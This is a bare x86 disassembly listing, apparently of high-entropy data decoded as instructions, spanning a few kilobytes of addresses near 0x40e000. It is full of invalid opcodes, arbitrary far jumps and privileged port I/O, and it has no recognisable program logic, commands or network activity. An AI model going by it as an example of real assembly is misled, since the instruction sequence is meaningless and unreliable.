  40e365:	mov    ebp,0x3c3c2d06
  40e36a:	bndldx bnd0,[eax+0x1847270c]
  40e371:	(bad)  
  40e372:	xchg   esp,eax
  40e373:	gs call 0x61ab:0x6d2e459
  40e37b:	or     esp,DWORD PTR ds:0x6393e9a3
  40e381:	or     BYTE PTR [esi-0x4d511c53],dh
  40e387:	lea    edx,[ecx+0x31]
  40e38a:	and    eax,0x5ac2348
  40e38f:	mov    ah,0xb1
  40e391:	daa    
  40e392:	jo     0x40e34f
  40e394:	dec    edx
  40e395:	jnp    0x40e351
  40e397:	push   ebx
  40e398:	aam    0xe1
  40e39a:	shl    esp,0xf6
  40e39d:	push   es
  40e39e:	push   edx
  40e39f:	or     DWORD PTR [ecx+eiz*2-0x7d41907e],edx
  40e3a6:	aas    
  40e3a7:	add    al,0x8
  40e3a9:	add    eax,0xc9e7195a
  40e3ae:	add    DWORD PTR [ecx+0x4a],ebp
  40e3b1:	cmovge edi,DWORD PTR ds:0x76f06b15
  40e3b8:	mov    dl,0xbc
  40e3ba:	shr    al,0x97
  40e3bd:	fadd   st(3),st
  40e3bf:	cmp    BYTE PTR [eax+0x32b0f995],bh
  40e3c5:	pop    ecx
  40e3c6:	mov    dl,0xfe
  40e3c8:	(bad)  
  40e3c9:	cmc    
  40e3ca:	pop    esi
  40e3cb:	pop    ebx
  40e3cc:	ficom  WORD PTR [esi+ebx*1]
  40e3cf:	push   ecx
  40e3d0:	jge    0x40e392
  40e3d2:	outs   dx,DWORD PTR ds:[esi]
  40e3d3:	hlt    
  40e3d4:	test   DWORD PTR [edx],ebp
  40e3d6:	jns    0x40e387
  40e3d8:	sahf   
  40e3d9:	ins    BYTE PTR es:[edi],dx
  40e3da:	fwait
  40e3db:	dec    ecx
  40e3dc:	stos   DWORD PTR es:[edi],eax
  40e3dd:	pop    ss
  40e3de:	and    al,0x25
  40e3e0:	es inc ecx
  40e3e2:	push   esp
  40e3e3:	ss pop edi
  40e3e5:	jp     0x40e36a
  40e3e7:	cmp    esi,DWORD PTR [edx+0x57]
  40e3ea:	pop    ecx
  40e3eb:	xor    esi,DWORD PTR [esp+eax*1+0x25]
  40e3ef:	jg     0x40e371
  40e3f1:	mov    eax,0x913c4f69
  40e3f6:	push   edi
  40e3f7:	jno    0x40e45f
  40e3f9:	outs   dx,DWORD PTR ds:[esi]
  40e3fa:	stos   DWORD PTR es:[edi],eax
  40e3fb:	jo     0x40e458
  40e3fd:	dec    eax
  40e3fe:	mov    cl,0x46
  40e400:	enter  0xb9ce,0x83
  40e404:	scas   al,BYTE PTR es:[edi]
  40e405:	in     eax,0x21
  40e407:	nop
  40e408:	fiadd  WORD PTR [esi+ebx*2+0x27]
  40e40c:	and    ah,ah
  40e40e:	adc    bl,BYTE PTR [eax-0x2feee55e]
  40e414:	mov    ds:0xf741bf22,al
  40e419:	mov    WORD PTR [eax],ss
  40e41b:	lods   eax,DWORD PTR ds:[esi]
  40e41c:	popa   
  40e41d:	popf   
  40e41e:	pmaxub mm0,QWORD PTR ds:[eax+0x1dbfacaf]
  40e426:	or     bl,cl
  40e428:	or     ah,0x7d
  40e42b:	mov    ebx,0x5b6373ce
  40e430:	jge    0x40e3f3
  40e432:	loope  0x40e4b2
  40e434:	xchg   ebx,eax
  40e435:	lods   eax,DWORD PTR ds:[esi]
  40e436:	dec    ebx
  40e437:	mov    eax,0x483d5e19
  40e43c:	das    
  40e43d:	hlt    
  40e43e:	or     ch,BYTE PTR [esi]
  40e440:	ss and al,0x74
  40e443:	pop    eax
  40e444:	aas    
  40e445:	fmul   DWORD PTR [edi+0x35]
  40e448:	push   esi
  40e449:	jecxz  0x40e425
  40e44b:	call   0x8bf5:0x591fd1a9
  40e452:	(bad)  
  40e453:	sbb    al,0x98
  40e455:	(bad)  
  40e456:	dec    ebp
  40e457:	ret    0xb366
  40e45a:	cmp    DWORD PTR [esi-0x4d],edx
  40e45d:	pop    esi
  40e45e:	add    BYTE PTR [edx],0x9
  40e461:	add    DWORD PTR [esi-0x64dc1550],eax
  40e467:	stos   BYTE PTR es:[edi],al
  40e468:	and    ecx,edx
  40e46a:	add    dl,BYTE PTR [edi]
  40e46c:	clc    
  40e46d:	das    
  40e46e:	outs   dx,DWORD PTR ds:[esi]
  40e46f:	pop    ebp
  40e470:	dec    ecx
  40e471:	xor    eax,0xc9d129d6
  40e476:	pusha  
  40e477:	aam    0xa9
  40e479:	(bad)  
  40e47b:	add    al,0x33
  40e47d:	scas   al,BYTE PTR es:[edi]
  40e47e:	stos   DWORD PTR es:[edi],eax
  40e47f:	cmp    BYTE PTR [eax+0xd2d3045],0x1b
  40e486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e487:	outs   dx,BYTE PTR ds:[esi]
  40e488:	pop    ss
  40e489:	(bad)  
  40e48a:	je     0x40e497
  40e48c:	rol    BYTE PTR [esi-0x3118be39],1
  40e492:	or     edx,edi
  40e494:	(bad)  
  40e495:	lods   eax,DWORD PTR ds:[esi]
  40e496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e497:	mov    eax,0xd9b00ea9
  40e49c:	mov    dl,0x21
  40e49e:	jle    0x40e48c
  40e4a0:	cdq    
  40e4a1:	aaa    
  40e4a2:	fmul   QWORD PTR [edx+edi*2+0x5c149ac5]
  40e4a9:	dec    esi
  40e4aa:	push   esi
  40e4ab:	sub    esi,esp
  40e4ad:	out    dx,al
  40e4ae:	jecxz  0x40e43f
  40e4b0:	frstor [ebp-0x1f9df80e]
  40e4b6:	pop    ecx
  40e4b7:	jge    0x40e51f
  40e4b9:	or     DWORD PTR [edi+0x2],edx
  40e4bc:	ret    0x2ac3
  40e4bf:	cdq    
  40e4c0:	pop    ebp
  40e4c1:	jo     0x40e4f1
  40e4c3:	xchg   ebx,eax
  40e4c4:	sub    eax,0x42daed4
  40e4c9:	jmp    0x40e45a
  40e4cb:	(bad)  
  40e4cc:	and    eax,0x405e176b
  40e4d1:	adc    bh,BYTE PTR [esi+0x57ef55c1]
  40e4d7:	jle    0x40e4af
  40e4d9:	sub    dl,BYTE PTR ds:0x582f3e8d
  40e4df:	in     eax,0x4e
  40e4e1:	fild   QWORD PTR [ebp+eiz*4-0x326feca1]
  40e4e8:	cmp    eax,0x929638ce
  40e4ed:	push   ebx
  40e4ee:	pusha  
  40e4ef:	dec    edi
  40e4f0:	push   es
  40e4f1:	mov    eax,ebx
  40e4f3:	jmp    FWORD PTR [ecx+0xc]
  40e4f6:	les    ebp,FWORD PTR [ebp-0x43]
  40e4f9:	addr16 enter 0x41b5,0xd3
  40e4fe:	pop    edi
  40e4ff:	jg     0x40e485
  40e501:	pop    ss
  40e502:	sbb    al,0x39
  40e504:	aam    0x36
  40e506:	lds    ebx,FWORD PTR [ebp+0x17]
  40e509:	cmp    eax,0x68cb20f1
  40e50e:	pop    ebx
  40e50f:	adc    al,BYTE PTR [ebx]
  40e511:	fadd   DWORD PTR [eax+0x19]
  40e514:	inc    esp
  40e515:	xchg   esp,eax
  40e516:	out    0xc,al
  40e518:	retf   
  40e519:	mov    al,ds:0x3b5f3068
  40e51e:	loopne 0x40e4e3
  40e520:	add    ebx,0x5134ecca
  40e526:	add    al,BYTE PTR [ebx+0xcfbf848]
  40e52c:	mov    esp,0x98b6f243
  40e531:	jl     0x40e4c1
  40e533:	push   cs
  40e534:	inc    ebx
  40e535:	aam    0xe
  40e537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e538:	and    esi,DWORD PTR [esi-0x47d60c1b]
  40e53e:	mov    bh,0x3c
  40e540:	dec    edi
  40e541:	cld    
  40e542:	jns    0x40e4cb
  40e544:	sbb    al,0xd
  40e546:	in     eax,dx
  40e547:	cmp    esp,eax
  40e549:	sti    
  40e54a:	adc    ecx,DWORD PTR [edi-0x7332d5dd]
  40e550:	xor    eax,0xe5183ea
  40e555:	mov    dl,0xc8
  40e557:	jmp    0xb2eaacff
  40e55c:	inc    ebp
  40e55d:	mov    ds:0xc306ce7e,al
  40e562:	mov    ebx,0x60ad6180
  40e567:	push   0x70
  40e569:	and    BYTE PTR [edi],dh
  40e56b:	xor    BYTE PTR [esi],0xea
  40e56e:	addr16 xor al,0xe9
  40e571:	fild   QWORD PTR [ebx+0x21eed74]
  40e577:	fisttp WORD PTR [edx]
  40e579:	mov    ch,BYTE PTR [esi+0x1]
  40e57c:	push   ebp
  40e57d:	pop    ebx
  40e57e:	fxtract 
  40e580:	stos   DWORD PTR es:[edi],eax
  40e581:	stos   DWORD PTR es:[edi],eax
  40e582:	and    edi,DWORD PTR [edx-0x10]
  40e585:	and    cl,BYTE PTR [edx]
  40e587:	mov    ebp,0x961eb545
  40e58c:	aas    
  40e58d:	push   cs
  40e58e:	call   0x9d62:0xed46cec9
  40e595:	and    BYTE PTR [ecx+0x11],0xe3
  40e599:	inc    ebx
  40e59a:	pop    ecx
  40e59b:	sbb    eax,0xdf3666e4
  40e5a0:	mov    al,ds:0x1678954b
  40e5a5:	aaa    
  40e5a6:	out    dx,al
  40e5a7:	mov    al,ds:0x4634cd9f
  40e5ac:	and    BYTE PTR [ebx],ch
  40e5ae:	jl     0x40e545
  40e5b0:	and    DWORD PTR [edx+edx*4],ecx
  40e5b3:	test   al,0x12
  40e5b5:	pop    ss
  40e5b6:	ret    0x605f
  40e5b9:	add    al,0xbc
  40e5bb:	mov    edx,ebx
  40e5bd:	pop    ebp
  40e5be:	inc    ecx
  40e5bf:	sti    
  40e5c0:	add    ebp,DWORD PTR [eax+0x10]
  40e5c3:	xchg   esi,eax
  40e5c4:	push   edx
  40e5c5:	pop    edi
  40e5c6:	sbb    al,0x16
  40e5c8:	xchg   edx,eax
  40e5c9:	cmp    ebx,edi
  40e5cb:	std    
  40e5cc:	fcmovnu st,st(0)
  40e5ce:	mov    edx,esi
  40e5d0:	aas    
  40e5d1:	mov    cl,0xcd
  40e5d3:	out    dx,eax
  40e5d4:	xor    bl,dl
  40e5d6:	lock iret 
  40e5d8:	mov    BYTE PTR [ebx+0x1],bl
  40e5db:	cmp    eax,0x18420450
  40e5e0:	popf   
  40e5e1:	add    DWORD PTR [edi-0x74305434],edx
  40e5e7:	jmp    0xfd31:0x1237ace7
  40e5ee:	lods   al,BYTE PTR ds:[esi]
  40e5ef:	sub    bh,BYTE PTR [eax]
  40e5f1:	pop    es
  40e5f2:	push   0xfffffffd
  40e5f4:	cli    
  40e5f5:	sar    DWORD PTR [ebp+0x11],cl
  40e5f8:	leavew 
  40e5fa:	sbb    al,0x48
  40e5fc:	sub    esi,esp
  40e5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ff:	clc    
  40e600:	imul   edi,DWORD PTR [eax],0xffffffe9
  40e603:	stos   BYTE PTR es:[edi],al
  40e604:	pop    es
  40e605:	dec    ebp
  40e606:	mov    eax,0x169554f2
  40e60b:	dec    edx
  40e60c:	mov    dl,0x3d
  40e60e:	and    al,0xd6
  40e610:	jae    0x40e626
  40e612:	pop    ebx
  40e613:	(bad)  
  40e614:	dec    ecx
  40e615:	sub    al,0xb1
  40e617:	mov    ebp,0xdf35052b
  40e61c:	popa   
  40e61d:	js     0x40e65f
  40e61f:	sahf   
  40e620:	sbb    bh,al
  40e622:	push   es
  40e623:	aam    0xb0
  40e625:	mov    bh,0x6e
  40e627:	and    dh,BYTE PTR [ecx+0x105d608]
  40e62d:	inc    esi
  40e62e:	stc    
  40e62f:	imul   ecx,esp,0xffffffa1
  40e632:	cmc    
  40e633:	(bad)  [ecx]
  40e635:	sub    cl,BYTE PTR [esi+0x31e350e9]
  40e63b:	fistp  DWORD PTR [ecx]
  40e63d:	mov    ebp,DWORD PTR [esi]
  40e63f:	or     cl,dl
  40e641:	xchg   edi,eax
  40e642:	ds xchg esp,eax
  40e644:	sar    DWORD PTR [ebx],cl
  40e646:	test   al,0x95
  40e648:	push   ebx
  40e649:	inc    esi
  40e64a:	enter  0x1c26,0xb3
  40e64e:	in     eax,dx
  40e64f:	aam    0xd3
  40e651:	jle    0x40e6ce
  40e653:	and    BYTE PTR [eax],ch
  40e655:	out    0x4f,eax
  40e657:	gs xchg ebp,eax
  40e659:	or     al,0x63
  40e65b:	ror    DWORD PTR [ebp+eiz*4-0x33670e14],1
  40e662:	int3   
  40e663:	push   ebx
  40e664:	ja     0x40e68c
  40e666:	push   esp
  40e667:	stos   BYTE PTR es:[edi],al
  40e668:	push   es
  40e669:	lods   al,BYTE PTR ds:[esi]
  40e66a:	pop    esi
  40e66b:	sbb    al,0x86
  40e66d:	adc    esp,ebx
  40e66f:	cmp    DWORD PTR [esi],esp
  40e671:	jae    0x40e610
  40e673:	rcl    DWORD PTR [eax-0x5b44259f],1
  40e679:	inc    edx
  40e67a:	mov    cl,0xe8
  40e67c:	add    DWORD PTR [edi],0x8fe0914f
  40e682:	mov    ch,0xeb
  40e684:	lds    ebx,FWORD PTR ds:0x9a17606
  40e68a:	aad    0x76
  40e68c:	lock pop ebp
  40e68e:	test   DWORD PTR [ebx-0x6d],0xf0c3b95b
  40e695:	sub    BYTE PTR [ecx+0x6c3ee17a],al
  40e69b:	or     BYTE PTR [ebx+0x4b],ch
  40e69e:	test   al,0x40
  40e6a0:	jbe    0x40e6a7
  40e6a2:	fiadd  DWORD PTR [ebx]
  40e6a4:	mov    DWORD PTR ds:0x583b8568,ebx
  40e6aa:	gs int 0xde
  40e6ad:	cmp    ah,BYTE PTR [edi+eiz*2-0x2c803b1f]
  40e6b4:	adc    dl,BYTE PTR [edi+ebp*2-0x76bacfd6]
  40e6bb:	xor    ah,cl
  40e6bd:	push   0x2cb7b55a
  40e6c2:	pop    ecx
  40e6c3:	dec    ebp
  40e6c4:	mov    ecx,0x37719841
  40e6c9:	or     esp,ecx
  40e6cb:	(bad)  [edi]
  40e6cd:	inc    edi
  40e6ce:	xchg   ch,bh
  40e6d0:	xor    eax,0x11ba10e7
  40e6d5:	mov    cs,WORD PTR [ecx-0x6d]
  40e6d8:	ds pop es
  40e6da:	adc    eax,0xd81f584e
  40e6df:	ds test ecx,esi
  40e6e2:	dec    edx
  40e6e3:	push   0xf61718b8
  40e6e8:	test   al,0xf5
  40e6ea:	dec    esp
  40e6eb:	or     ecx,DWORD PTR ds:0xb0fdeca3
  40e6f1:	mov    al,0xa3
  40e6f3:	cld    
  40e6f4:	dec    ebp
  40e6f5:	int    0xad
  40e6f7:	popa   
  40e6f8:	fwait
  40e6f9:	jecxz  0x40e6f1
  40e6fb:	scas   eax,DWORD PTR es:[edi]
  40e6fc:	sbb    edi,edx
  40e6fe:	pop    ebx
  40e6ff:	push   esp
  40e700:	ror    BYTE PTR [edi+0x75],1
  40e703:	xchg   esp,eax
  40e704:	jnp    0x40e6db
  40e706:	push   0x82ad215a
  40e70b:	(bad)  
  40e70c:	clc    
  40e70d:	and    ah,BYTE PTR [ebp+0x60]
  40e710:	xlat   BYTE PTR ds:[ebx]
  40e711:	xchg   edi,eax
  40e712:	retf   0xe11
  40e715:	dec    eax
  40e716:	push   0x4d
  40e718:	cmc    
  40e719:	xchg   esp,eax
  40e71a:	pop    esi
  40e71b:	arpl   WORD PTR [edx+0x2a5cd4b3],di
  40e721:	loop   0x40e711
  40e723:	ja     0x40e6c6
  40e725:	scas   al,BYTE PTR es:[edi]
  40e726:	and    edx,DWORD PTR [eax]
  40e728:	jne    0x40e6f9
  40e72a:	sar    DWORD PTR [esi],cl
  40e72c:	jge    0x40e729
  40e72e:	mov    edx,ecx
  40e730:	jmp    0xd0177b61
  40e735:	push   ebp
  40e736:	sbb    eax,0x88bf6889
  40e73b:	and    dl,ch
  40e73d:	gs inc esi
  40e73f:	cwde   
  40e740:	mov    edi,0x7785f6bb
  40e745:	pop    esp
  40e746:	in     al,dx
  40e747:	je     0x40e728
  40e749:	ret    0x93be
  40e74c:	fmul   DWORD PTR ds:0xb8d10fa9
  40e752:	fsub   DWORD PTR [ecx-0x11]
  40e755:	push   esp
  40e756:	mov    ch,0x71
  40e758:	mov    ds:0xf1796316,al
  40e75d:	dec    esi
  40e75e:	or     DWORD PTR [ebp-0x4b95bc80],esp
  40e764:	ret    
  40e765:	mov    al,0x8f
  40e767:	mov    eax,ds:0xb41f4f5
  40e76c:	cmp    BYTE PTR [ecx+edi*1],dh
  40e76f:	add    eax,0xaa30d69c
  40e774:	xchg   esp,eax
  40e775:	in     al,0x59
  40e777:	pushf  
  40e778:	sub    cl,dl
  40e77a:	adc    DWORD PTR [edi],esi
  40e77c:	adc    dh,0x7f
  40e77f:	push   esp
  40e780:	xchg   ebx,eax
  40e781:	cmp    BYTE PTR [ecx+0x277a2aea],bh
  40e787:	cld    
  40e788:	dec    edi
  40e789:	push   edi
  40e78a:	das    
  40e78b:	fisub  DWORD PTR ds:0xcb2187fd
  40e791:	outs   dx,BYTE PTR ds:[esi]
  40e792:	test   BYTE PTR [edx+0x39016846],dl
  40e798:	push   ecx
  40e799:	pop    ebx
  40e79a:	hlt    
  40e79b:	loop   0x40e733
  40e79d:	inc    esi
  40e79e:	mov    bh,0x5
  40e7a0:	sbb    edx,edi
  40e7a2:	dec    edi
  40e7a3:	sub    ecx,DWORD PTR [esi+0x19]
  40e7a6:	test   BYTE PTR [esi],ch
  40e7a8:	shr    DWORD PTR [ecx-0x2dc91c2c],1
  40e7ae:	jbe    0x40e751
  40e7b0:	inc    eax
  40e7b1:	xchg   ebp,eax
  40e7b2:	lods   al,BYTE PTR ds:[esi]
  40e7b3:	mov    ah,0x76
  40e7b5:	cld    
  40e7b6:	in     al,dx
  40e7b7:	mov    ds:0xa28724fd,eax
  40e7bc:	test   esp,edi
  40e7be:	out    0x11,eax
  40e7c0:	xor    DWORD PTR [ebp+0x13],esi
  40e7c3:	mov    ebx,0x61338656
  40e7c8:	push   cs
  40e7c9:	push   0x603edd0e
  40e7ce:	ins    BYTE PTR es:[edi],dx
  40e7cf:	push   ss
  40e7d0:	or     eax,DWORD PTR [edi+0x7e]
  40e7d3:	aam    0x6c
  40e7d5:	jb     0x40e7c5
  40e7d7:	pop    edx
  40e7d8:	gs jge 0x40e775
  40e7db:	cmp    bl,dl
  40e7dd:	dec    edi
  40e7de:	adc    eax,0xd775e4c3
  40e7e3:	adc    DWORD PTR [ebx+0x2f7493ac],0x7ae67f27
  40e7ed:	in     al,0x67
  40e7ef:	mov    dh,BYTE PTR [esp+ebx*8-0xc7dea34]
  40e7f6:	dec    esi
  40e7f7:	jp     0x40e7c2
  40e7f9:	jbe    0x40e82f
  40e7fb:	mov    ebp,0x64c12ddb
  40e800:	cld    
  40e801:	shl    DWORD PTR [eax],cl
  40e803:	or     esi,edi
  40e805:	mov    cl,BYTE PTR [edi-0x20]
  40e808:	dec    esi
  40e809:	imul   esi,DWORD PTR [ebp+0x2b],0xa512f63e
  40e810:	aad    0x66
  40e812:	add    BYTE PTR [edx-0x2f821c97],dh
  40e818:	jne    0x40e7e6
  40e81a:	xlat   BYTE PTR ds:[ebx]
  40e81b:	shl    BYTE PTR [ebx+ecx*1],0xfc
  40e81f:	jae    0x40e820
  40e821:	ror    BYTE PTR [esi+0x321a8500],cl
  40e827:	add    eax,0x371b7253
  40e82c:	inc    esi
  40e82d:	dec    esp
  40e82e:	xchg   BYTE PTR [esi+0x3c96a697],ah
  40e834:	pop    ebp
  40e835:	mov    eax,0xdf2b0552
  40e83a:	sbb    al,0x11
  40e83c:	sub    ebp,eax
  40e83e:	mov    ah,0xeb
  40e840:	ror    BYTE PTR [edx],cl
  40e842:	add    BYTE PTR [edi-0x46ece609],ah
  40e848:	aam    0xcc
  40e84a:	ins    BYTE PTR es:[edi],dx
  40e84b:	xor    ebp,DWORD PTR [eax]
  40e84d:	mov    bl,0x72
  40e84f:	mov    dl,0x3d
  40e851:	in     al,0xed
  40e853:	popa   
  40e854:	xlat   BYTE PTR ds:[ebx]
  40e855:	adc    al,0x93
  40e857:	fidivr WORD PTR [eax+0x311f057]
  40e85d:	(bad)  ds:0xcfec84f0
  40e863:	sbb    BYTE PTR [edx+0x2b7ecf38],0x8f
  40e86a:	xchg   ebp,eax
  40e86b:	in     al,dx
  40e86c:	loopne 0x40e85c
  40e86e:	retf   
  40e86f:	sahf   
  40e870:	xor    al,BYTE PTR [esi]
  40e872:	es push esi
  40e874:	mov    dl,0x18
  40e876:	dec    esp
  40e877:	stc    
  40e878:	inc    edi
  40e879:	inc    ebx
  40e87a:	mov    ecx,0xecbc2dbf
  40e87f:	cmp    al,0x27
  40e881:	addr16 sbb ebx,ecx
  40e884:	xchg   ebp,eax
  40e885:	and    al,BYTE PTR [ebp-0x2a]
  40e888:	in     eax,dx
  40e889:	imul   ebx,DWORD PTR [ebp+0x6d],0x755d7c7c
  40e890:	jmp    0xe09a44a4
  40e895:	mov    ecx,0x442b098a
  40e89a:	jmp    0x4074:0x2e996a5b
  40e8a1:	cmc    
  40e8a2:	into   
  40e8a3:	test   DWORD PTR [edi+0x41],edx
  40e8a6:	icebp  
  40e8a7:	pop    esi
  40e8a8:	das    
  40e8a9:	cmc    
  40e8aa:	adc    eax,DWORD PTR [esi+edx*4+0x66]
  40e8ae:	fwait
  40e8af:	iret   
  40e8b0:	xor    ebp,DWORD PTR [eax-0x48]
  40e8b3:	and    BYTE PTR ds:0x6f31536c,bh
  40e8b9:	cmp    ah,bl
  40e8bb:	mov    ds:0x5ad1d5c2,al
  40e8c0:	adc    al,0x84
  40e8c2:	fld    TBYTE PTR [ebp+0x4a]
  40e8c5:	xchg   BYTE PTR [eax-0x60],dl
  40e8c8:	pop    esp
  40e8c9:	fwait
  40e8ca:	jle    0x40e86f
  40e8cc:	aam    0xa7
  40e8ce:	sar    eax,cl
  40e8d0:	leave  
  40e8d1:	cmp    BYTE PTR [edx+ebp*1-0x71e0b498],ch
  40e8d8:	sbb    bl,BYTE PTR [edx]
  40e8da:	add    al,BYTE PTR [edx]
  40e8dc:	inc    edx
  40e8dd:	loope  0x40e8c5
  40e8df:	push   ss
  40e8e0:	pop    ebp
  40e8e1:	sub    eax,0x82428b26
  40e8e6:	or     eax,0x2ef16a12
  40e8eb:	je     0x40e947
  40e8ed:	lock out 0x8e,al
  40e8f0:	cmp    cl,BYTE PTR [edx+ebp*2]
  40e8f3:	adc    DWORD PTR [ecx-0x7bc4da8c],ebx
  40e8f9:	adc    al,0x76
  40e8fb:	push   0xd68cd678
  40e900:	pop    ss
  40e901:	pop    eax
  40e902:	dec    edi
  40e903:	mov    al,0x47
  40e905:	or     eax,0x7c128196
  40e90a:	pop    edi
  40e90b:	arpl   bx,sp
  40e90d:	sbb    BYTE PTR [esi-0x23a53488],bh
  40e913:	das    
  40e914:	stos   BYTE PTR es:[edi],al
  40e915:	cmp    edi,DWORD PTR [ecx-0x1638dfdd]
  40e91b:	repz mov ebp,ebp
  40e91e:	repz repnz pop ds
  40e921:	pop    edi
  40e922:	push   ss
  40e923:	pushf  
  40e924:	rcl    DWORD PTR [ebx-0x2b9bdcb5],1
  40e92a:	inc    DWORD PTR [esi]
  40e92c:	les    ebx,FWORD PTR [ebx+ecx*2+0x56]
  40e930:	dec    ecx
  40e931:	mov    bl,0x3e
  40e933:	dec    ebx
  40e934:	(bad)
  40e938:	fmul   DWORD PTR [ebp-0x7be9da4f]
  40e93e:	xor    al,0x73
  40e940:	fsubp  st(2),st
  40e942:	or     esi,eax
  40e944:	or     ebx,0x14749d46
  40e94a:	xchg   ebx,eax
  40e94b:	(bad)  
  40e94c:	push   edx
  40e94d:	xchg   edi,eax
  40e94e:	sub    DWORD PTR [esi+0x72763d0],edx
  40e954:	fwait
  40e955:	pop    esp
  40e956:	dec    edx
  40e957:	sub    ebx,DWORD PTR [ecx]
  40e959:	mov    bl,0x19
  40e95b:	fnstcw WORD PTR [edi-0x68909611]
  40e961:	push   ds
  40e962:	mov    eax,ds:0x64872010
  40e967:	mov    ch,0x1f
  40e969:	sbb    eax,0xfbb1d61c
  40e96e:	xchg   esi,eax
  40e96f:	push   cs
  40e970:	add    DWORD PTR [edx-0x71],ebp
  40e973:	imul   ebx,ebp,0x6f
  40e976:	jecxz  0x40e9e8
  40e978:	das    
  40e979:	inc    esi
  40e97a:	scas   eax,DWORD PTR es:[edi]
  40e97b:	popf   
  40e97c:	out    dx,eax
  40e97d:	clc    
  40e97e:	adc    edx,ebx
  40e980:	xor    DWORD PTR [edi],edi
  40e982:	test   ch,0x6d
  40e985:	sub    ah,BYTE PTR [edx-0x6f]
  40e988:	pusha  
  40e989:	xchg   edx,eax
  40e98a:	fimul  WORD PTR [ebp+0x3f0d9c42]
  40e990:	adc    BYTE PTR [edx-0x4bd1b276],bl
  40e996:	push   esp
  40e997:	or     dl,dh
  40e999:	mov    ch,bl
  40e99b:	in     al,0x36
  40e99d:	popa   
  40e99e:	enter  0x564,0xd4
  40e9a2:	sbb    bl,BYTE PTR [edx+0x61319344]
  40e9a8:	fimul  WORD PTR [ebx-0x3d7e647c]
  40e9ae:	adc    al,0x34
  40e9b0:	xlat   BYTE PTR ss:[ebx]
  40e9b2:	loope  0x40e9fc
  40e9b4:	jae    0x40e9bd
  40e9b6:	inc    edi
  40e9b7:	mov    ch,0x52
  40e9b9:	ja     0x40e9d8
  40e9bb:	dec    eax
  40e9bc:	(bad)  
  40e9bd:	jno    0x40ea0e
  40e9bf:	std    
  40e9c0:	bnd jno 0x40e990
  40e9c3:	(bad)
  40e9c7:	jl     0x40ea3b
  40e9c9:	cmc    
  40e9ca:	pusha  
  40e9cb:	comiss xmm5,DWORD PTR [edx]
  40e9ce:	mov    ch,0x3d
  40e9d0:	ds xor eax,0xe3f2f540
  40e9d6:	pushf  
  40e9d7:	aas    
  40e9d8:	rol    BYTE PTR [edx],cl
  40e9da:	ja     0x40e9aa
  40e9dc:	fs push edi
  40e9de:	int    0xd
  40e9e0:	dec    ecx
  40e9e1:	popf   
  40e9e2:	enter  0xc2df,0x80
  40e9e6:	and    eax,0x92895caf
  40e9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ec:	iret   
  40e9ed:	fcmovnbe st,st(7)
  40e9ef:	mov    dh,0x7f
  40e9f1:	mov    ecx,0xfbf0feee
  40e9f6:	loopne 0x40e9cf
  40e9f8:	mov    al,ds:0x50952c90
  40e9fd:	add    eax,0x81c1d6ae
  40ea02:	je     0x40e9bf
  40ea04:	das    
  40ea05:	loopne 0x40ea2c
  40ea07:	mov    dh,0xab
  40ea09:	(bad)  
  40ea0a:	or     esi,edx
  40ea0c:	inc    esi
  40ea0d:	pushf  
  40ea0e:	jl     0x40e9ba
  40ea10:	test   eax,0xb370ff49
  40ea15:	outs   dx,DWORD PTR ds:[esi]
  40ea16:	cmp    BYTE PTR [edi-0x2027bff4],0x39
  40ea1d:	add    DWORD PTR [ebx+eiz*2],ebp
  40ea20:	cli    
  40ea21:	dec    ebx
  40ea22:	aad    0xdf
  40ea24:	sub    BYTE PTR [ecx],bh
  40ea26:	(bad)  
  40ea27:	std    
  40ea28:	xor    BYTE PTR [edi+0x35],bl
  40ea2b:	loopne 0x40ea83
  40ea2d:	jle    0x40eaad
  40ea2f:	mov    edi,0xef1a591f
  40ea34:	cmp    DWORD PTR [esi],edi
  40ea36:	pushf  
  40ea37:	nop
  40ea38:	pop    esp
  40ea39:	push   cs
  40ea3a:	dec    ebp
  40ea3b:	das    
  40ea3c:	add    ch,0xbf
  40ea3f:	mov    edi,0xf2f9b367
  40ea44:	mov    ebx,0xdc8b3c0d
  40ea49:	test   BYTE PTR [edi],bl
  40ea4b:	dec    esp
  40ea4c:	out    dx,eax
  40ea4d:	and    DWORD PTR [ecx-0x6fff2874],0xa6652caf
  40ea57:	(bad)  
  40ea58:	ins    DWORD PTR es:[edi],dx
  40ea59:	xor    al,0x5
  40ea5b:	xor    al,0xf9
  40ea5d:	mov    ebx,DWORD PTR [edx+0x63]
  40ea60:	inc    esi
  40ea61:	adc    DWORD PTR [ecx],0xffffffa2
  40ea64:	jbe    0x40ea8a
  40ea66:	jo     0x40ea75
  40ea68:	xchg   ebp,eax
  40ea69:	stos   BYTE PTR es:[edi],al
  40ea6a:	sub    edi,esp
  40ea6c:	pop    ebx
  40ea6d:	rol    BYTE PTR [edx+0x3ef53f56],1
  40ea73:	(bad)  [edi-0x7b]
  40ea76:	mov    bh,0x8b
  40ea78:	int    0x52
  40ea7a:	pop    ss
  40ea7b:	iret   
  40ea7c:	scas   al,BYTE PTR es:[edi]
  40ea7d:	push   ecx
  40ea7e:	dec    eax
  40ea7f:	bound  ebx,QWORD PTR [ebx+ebx*1-0x59fcaeea]
  40ea86:	jbe    0x40eb05
  40ea88:	mov    ah,bl
  40ea8a:	imul   ecx,DWORD PTR [edx],0xffffffc9
  40ea8d:	jmp    0xefd5:0x4a96b04
  40ea94:	fstp   QWORD PTR [ebx+eiz*2+0x5d]
  40ea98:	and    al,0x83
  40ea9a:	cmp    al,0xdc
  40ea9c:	cmp    al,BYTE PTR [esi]
  40ea9e:	sub    DWORD PTR [edx+0x2c],ecx
  40eaa1:	das    
  40eaa2:	add    esi,DWORD PTR ds:0xbb3e46d2
  40eaa8:	and    al,0x18
  40eaaa:	call   0x214d:0x54734754
  40eab1:	je     0x40eabe
  40eab3:	(bad)  
  40eab4:	enter  0xb0c2,0xc1
  40eab8:	into   
  40eab9:	dec    edx
  40eaba:	cmp    DWORD PTR [edi],esp
  40eabc:	sbb    BYTE PTR [esi+0x4bbf73ed],ch
  40eac2:	jnp    0x40eade
  40eac4:	out    dx,al
  40eac5:	cdq    
  40eac6:	cs mov esp,0x680bbcee
  40eacc:	mov    edi,0x568770fb
  40ead1:	(bad)  
  40ead2:	ins    DWORD PTR es:[edi],dx
  40ead3:	pop    ebp
  40ead4:	shr    DWORD PTR [edi+0x29],0xa8
